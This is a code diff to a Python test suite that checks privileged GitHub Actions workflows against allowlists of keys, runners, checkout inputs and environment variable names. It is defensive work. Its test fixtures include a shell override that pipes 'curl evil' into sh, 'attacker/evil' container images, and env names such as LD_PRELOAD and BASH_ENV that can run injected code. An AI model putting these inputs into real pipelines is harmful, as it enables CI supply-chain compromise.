@@ -167,6 +167,7 @@ REVIEWED_SCRIPTS = {
     "702b7387f6463ee3bf250f858beb60c0b79bf2a69e9b40b09712afc18ac63fc9": "post-release-probe.yml: Probe",
     "5ecb769ad73c21cabf679e16e9789e26703180160bf1f99c256550d611d66a27": "post-release-probe.yml: Open or update an alert issue",
     "8ea3df04f08a086a5bd673a77689303e2ebeca9cec5674345406b568089dcdd8": "post-release-probe.yml: Close the alert once healthy again",
+    "0df893cfbecb5f8cf7dc7516c1a45f00ef89eacacf9753b3890673d5c0a8b69d": "dco.yml: Check Signed-off-by on every commit",
 }
 
 
@@ -225,6 +226,118 @@ def _unreviewed_uses(workflow: Any) -> list[str]:
     ]
 
 
+# The rest of a privileged workflow fails closed too: reviewed bodies and pinned
+# actions mean nothing once a key runs them somewhere else. `container:` is the
+# shell every built-in `bash` really is, `services:` start images beside it,
+# `runs-on: self-hosted` hands the job to a machine this file cannot see, and
+# checkout's `repository`/`ref` swap the tree a reviewed body runs from. So every
+# key a privileged workflow, job or step sets must be one listed here, with the
+# same sign-off as REVIEWED_SCRIPTS.
+_REVIEWED_WORKFLOW_KEYS = frozenset(
+    {"name", "run-name", "on", True, "permissions", "concurrency", "env", "defaults", "jobs"}
+)
+_REVIEWED_JOB_KEYS = frozenset(
+    {"name", "runs-on", "permissions", "if", "needs", "steps", "timeout-minutes",
+     "concurrency", "outputs", "env", "defaults", "continue-on-error", "environment"}
+)
+_REVIEWED_STEP_KEYS = frozenset(
+    {"name", "id", "if", "run", "shell", "uses", "with", "env", "timeout-minutes",
+     "continue-on-error", "working-directory"}
+)
+_REVIEWED_DEFAULTS_RUN_KEYS = frozenset({"shell", "working-directory"})
+# GitHub-hosted images only, by their documented labels.
+_GITHUB_HOSTED_RUNNER = re.compile(r"^(?:ubuntu|windows|macos)-(?:latest|\d[\w.-]*)$")
+
+# The inputs each reviewed action may be given. Absent from checkout: `repository`,
+# `ref`, `token`, `ssh-key` and `submodules`, which pick the code a reviewed body
+# then runs; without them it checks out the commit the event names on the base
+# repository.
+REVIEWED_INPUTS = {
+    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262": frozenset(
+        {"fetch-depth", "fetch-tags", "persist-credentials", "sparse-checkout",
+         "sparse-checkout-cone-mode", "show-progress", "clean"}
+    ),
+    "actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b": frozenset(
+        {"script", "github-token", "result-encoding", "retries"}
+    ),
+}
+
+# Environment variable names a privileged workflow may set. A name is what the
+# program reads, so `BASH_ENV`, `LD_PRELOAD` or `NODE_OPTIONS` run other code
+# under a reviewed body; listing what is allowed fails closed on every such name.
+REVIEWED_ENV_NAMES = frozenset(
+    {"PROBE_URL", "PROBE_TOKEN", "PROBE_SUMMARY",
+     "NUMBER", "BASE", "REPO", "GH_TOKEN", "UPSTREAM"}
+)
+
+
+def _unreviewed_env(where: str, env: Any) -> list[str]:
+    if env is None:
+        return []
+    if not isinstance(env, dict):
+        return [f"{where}: env that is not a mapping"]
+    return [f"{where}: env {name!r}" for name in env if name not in REVIEWED_ENV_NAMES]
+
+
+def _unreviewed_defaults(where: str, defaults: Any) -> list[str]:
+    if defaults is None:
+        return []
+    if not isinstance(defaults, dict) or set(defaults) - {"run"}:
+        return [f"{where}: defaults other than run"]
+    run = defaults.get("run")
+    if not isinstance(run, dict):
+        return [f"{where}: defaults.run that is not a mapping"]
+    return [f"{where}: defaults.run.{k}" for k in run if k not in _REVIEWED_DEFAULTS_RUN_KEYS]
+
+
+def _unreviewed_step(where: str, step: Any) -> list[str]:
+    if not isinstance(step, dict):
+        return [f"{where}: a step that is not a mapping"]
+    found = [f"{where}: {k}" for k in step if k not in _REVIEWED_STEP_KEYS]
+    found += _unreviewed_env(where, step.get("env"))
+    uses = step.get("uses")
+    if isinstance(uses, str):
+        allowed = REVIEWED_INPUTS.get(uses.split("#", 1)[0].strip())
+        inputs = step.get("with") or {}
+        if not isinstance(inputs, dict):
+            found.append(f"{where}: with that is not a mapping")
+        elif allowed is not None:
+            found += [f"{where}: {uses.split('@', 1)[0]} input {k!r}" for k in inputs if k not in allowed]
+    return found
+
+
+def _unreviewed_parts(workflow: Any) -> list[str]:
+    """Each key, runner, input or env name in a privileged workflow that is not reviewed."""
+    if not isinstance(workflow, dict):
+        return ["the workflow is not a mapping"]
+    found = [f"workflow: {k}" for k in workflow if k not in _REVIEWED_WORKFLOW_KEYS]
+    found += _unreviewed_env("workflow", workflow.get("env"))
+    found += _unreviewed_defaults("workflow", workflow.get("defaults"))
+    jobs = workflow.get("jobs")
+    if jobs is None:
+        return found
+    if not isinstance(jobs, dict):
+        return found + ["jobs is not a mapping"]
+    for job_id, job in jobs.items():
+        where = f"job {job_id}"
+        if not isinstance(job, dict):
+            found.append(f"{where}: not a mapping")
+            continue
+        found += [f"{where}: {k}" for k in job if k not in _REVIEWED_JOB_KEYS]
+        runs_on = job.get("runs-on")
+        if runs_on is not None and not (isinstance(runs_on, str) and _GITHUB_HOSTED_RUNNER.match(runs_on)):
+            found.append(f"{where}: runs-on {runs_on!r}")
+        found += _unreviewed_env(where, job.get("env"))
+        found += _unreviewed_defaults(where, job.get("defaults"))
+        steps = job.get("steps") or []
+        if not isinstance(steps, list):
+            found.append(f"{where}: steps is not a list")
+            continue
+        for i, step in enumerate(steps):
+            found += _unreviewed_step(f"{where} step {i + 1}", step)
+    return found
+
+
 def _scripts(value: Any) -> list[str]:
     """Every `run` and `script` string: step commands and actions/github-script bodies."""
     if isinstance(value, dict):
@@ -264,7 +377,7 @@ def _references_pr_head(text: str) -> bool:
     except yaml.YAMLError:
         return True
     strings = _strings(workflow) + _conditions(workflow)
-    if _overridden_shells(workflow) or _unreviewed_uses(workflow):
+    if _overridden_shells(workflow) or _unreviewed_uses(workflow) or _unreviewed_parts(workflow):
         return True
     return bool(_unreviewed_scripts(workflow)) or any(
         _PR_HEAD_REF.search(_dotted(s))
@@ -535,11 +648,12 @@ class TestWorkflowTrust(unittest.TestCase):
             if _privileged(_text(p)) and _references_pr_head(_text(p))
         ]
         unreviewed = {p.name: _unreviewed_scripts(_parsed(p)) for p in WORKFLOWS if p.name in offenders}
+        parts = {p.name: _unreviewed_parts(_parsed(p)) for p in WORKFLOWS if p.name in offenders}
         self.assertEqual(
             offenders,
             [],
             "a privileged trigger checks out or references the PR head; "
-            f"script hashes not in REVIEWED_SCRIPTS: {unreviewed}",
+            f"script hashes not in REVIEWED_SCRIPTS: {unreviewed}; unreviewed keys, inputs or env: {parts}",
         )
 
     def test_pull_request_jobs_with_secrets_skip_forks(self) -> None:
@@ -829,10 +943,10 @@ class TestUngatedSecretJobs(unittest.TestCase):
                 self.assertFalse(
                     _references_pr_head(f"jobs:\n  a:\n    steps:\n      - with:\n          ref: ${{{{ {unflagged} }}}}\n")
                 )
-        reviewed = 'echo "$SUMMARY" [ok]'
+        reviewed = 'echo "$PROBE_SUMMARY" [ok]'
         env_form = (
             f"jobs:\n  a:\n    steps:\n      - run: {reviewed}\n"
-            "        env:\n          SUMMARY: ${{ steps.probe.outputs.summary }}\n"
+            "        env:\n          PROBE_SUMMARY: ${{ steps.probe.outputs.summary }}\n"
         )
         self.assertTrue(_references_pr_head(env_form))
         with mock.patch.dict(REVIEWED_SCRIPTS, {hashlib.sha256(reviewed.encode()).hexdigest(): "test"}):
@@ -862,11 +976,131 @@ class TestUngatedSecretJobs(unittest.TestCase):
             "- run: |\n          sha=$(jq -r .pull_request.head.sha \"$GITHUB_EVENT_PATH\")\n"
             "          git fetch origin \"$sha\" && git checkout FETCH_HEAD\n",
             "- uses: actions/github-script@v7\n        with:\n          script: return 1\n",
+            "- uses: actions/checkout@v4\n",
+            "- uses: actions/checkout@0000000000000000000000000000000000000000\n",
+            "- uses: docker://alpine:3\n",
+            "- shell: bash -c 'curl evil | sh; bash {0}'\n        run: echo ok\n",
         ):
             with self.subTest(step=step):
                 self.assertTrue(_references_pr_head(f"jobs:\n  a:\n    steps:\n      {step}"))
+        self.assertTrue(_references_pr_head("jobs:\n  a:\n    uses: ./.github/workflows/called.yml\n    secrets: inherit\n"))
         probe = REPO / ".github" / "workflows" / "post-release-probe.yml"
         self.assertEqual(_unreviewed_scripts(_parsed(probe)), [])
+        self.assertEqual(_unreviewed_parts(_parsed(probe)), [])
+
+
+class TestPrivilegedWorkflowsFailClosed(unittest.TestCase):
+    """Reviewed bodies and pins stay byte for byte the same in each case below,
+    while the job runs code nobody reviewed."""
+
+    CHECKOUT = "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
+    REVIEWED_BODY = "echo reviewed"
+
+    def workflow(self, job: str = "", step: str = "", top: str = "") -> str:
+        return (
+            "on:\n  workflow_run:\n    workflows: [Release]\n"
+            f"{top}"
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n"
+            f"{job}"
+            "    steps:\n"
+            f"      - uses: {self.CHECKOUT}\n"
+            f"{step}"
+            f"      - run: {self.REVIEWED_BODY}\n"
+        )
+
+    def flagged(self, text: str) -> bool:
+        with mock.patch.dict(REVIEWED_SCRIPTS, {hashlib.sha256(self.REVIEWED_BODY.encode()).hexdigest(): "test"}):
+            return _references_pr_head(text)
+
+    def test_the_baseline_passes(self) -> None:
+        self.assertFalse(self.flagged(self.workflow()))
+
+    def test_a_job_container_or_service_image_is_flagged(self) -> None:
+        for job in (
+            "    container: attacker/evil:latest\n",
+            "    container:\n      image: attacker/evil@sha256:" + "0" * 64 + "\n",
+            "    services:\n      db:\n        image: attacker/evil:latest\n",
+        ):
+            with self.subTest(job=job):
+                self.assertTrue(self.flagged(self.workflow(job=job)))
+
+    def test_a_runner_github_does_not_host_is_flagged(self) -> None:
+        for runs_on in ("self-hosted", "[self-hosted, linux]", "{group: builders}", "${{ inputs.runner }}"):
+            with self.subTest(runs_on=runs_on):
+                text = self.workflow().replace("runs-on: ubuntu-latest", f"runs-on: {runs_on}")
+                self.assertTrue(self.flagged(text))
+
+    def test_checkout_inputs_that_pick_other_code_are_flagged(self) -> None:
+        for inputs in (
+            "repository: attacker/evil\n          ref: main",
+            "ref: main",
+            "ref: 0123456789abcdef0123456789abcdef01234567",
+            "submodules: recursive",
+            "ssh-key: ${{ secrets.DEPLOY_KEY }}",
+            "token: ${{ secrets.PAT }}",
+        ):
+            with self.subTest(inputs=inputs):
+                text = self.workflow().replace(
+                    f"      - uses: {self.CHECKOUT}\n",
+                    f"      - uses: {self.CHECKOUT}\n        with:\n          {inputs}\n",
+                )
+                self.assertTrue(self.flagged(text))
+
+    def test_reviewed_checkout_inputs_pass(self) -> None:
+        text = self.workflow().replace(
+            f"      - uses: {self.CHECKOUT}\n",
+            f"      - uses: {self.CHECKOUT}\n        with:\n          fetch-depth: 0\n          persist-credentials: false\n",
+        )
+        self.assertFalse(self.flagged(text))
+
+    def test_env_a_program_reads_to_run_other_code_is_flagged(self) -> None:
+        for name in ("BASH_ENV", "ENV", "LD_PRELOAD", "NODE_OPTIONS", "PYTHONSTARTUP", "GIT_SSH_COMMAND", "PATH"):
+            for where in ("top", "job", "step"):
+                with self.subTest(name=name, where=where):
+                    env = f"env:\n  {name}: /tmp/x\n"
+                    if where == "top":
+                        text = self.workflow(top=env)
+                    elif where == "job":
+                        text = self.workflow(job="    " + env.replace("\n  ", "\n      "))
+                    else:
+                        text = self.workflow().replace(
+                            f"      - run: {self.REVIEWED_BODY}\n",
+                            f"      - run: {self.REVIEWED_BODY}\n        env:\n          {name}: /tmp/x\n",
+                        )
+                    self.assertTrue(self.flagged(text))
+
+    def test_unknown_workflow_job_and_step_keys_are_flagged(self) -> None:
+        cases = (
+            self.workflow(top="defaults:\n  run:\n    shell: bash\n    unknown: x\n"),
+            self.workflow(job="    strategy:\n      matrix:\n        x: [1]\n"),
+            self.workflow(job="    secrets: inherit\n"),
+            self.workflow().replace(
+                f"      - run: {self.REVIEWED_BODY}\n", f"      - run: {self.REVIEWED_BODY}\n        unknown: x\n"
+            ),
+        )
+        for text in cases:
+            with self.subTest(text=text):
+                self.assertTrue(self.flagged(text))
+
+    def test_every_reviewed_action_names_its_reviewed_inputs(self) -> None:
+        self.assertEqual(set(REVIEWED_INPUTS), REVIEWED_USES)
+
+    def test_the_downstream_sign_off_check_passes(self) -> None:
+        # The sign-off workflow a downstream copy of this repository runs.
+        dco = (
+            "name: dco\n"
+            "on:\n  pull_request_target:\n    types: [opened, synchronize, reopened]\n"
+            "permissions:\n  contents: read\n  pull-requests: read\n"
+            "jobs:\n  signoff:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - name: Check Signed-off-by on every commit\n        shell: bash\n        env:\n"
+            "          NUMBER: ${{ github.event.pull_request.number }}\n"
+            "          BASE: ${{ github.event.pull_request.base.sha }}\n"
+            "          REPO: ${{ github.repository }}\n"
+            "          GH_TOKEN: ${{ github.token }}\n"
+            "          UPSTREAM: https://github.com/pipeshub-ai/pipeshub-ai.git\n"
+            "        run: echo reviewed\n"
+        )
+        self.assertEqual(_unreviewed_parts(yaml.load(dco, Loader=_StrictLoader)), [])
 
 class TestUnguardedSecretJobs(unittest.TestCase):
     def test_a_guarded_job_does_not_cover_an_unguarded_one(self) -> None:
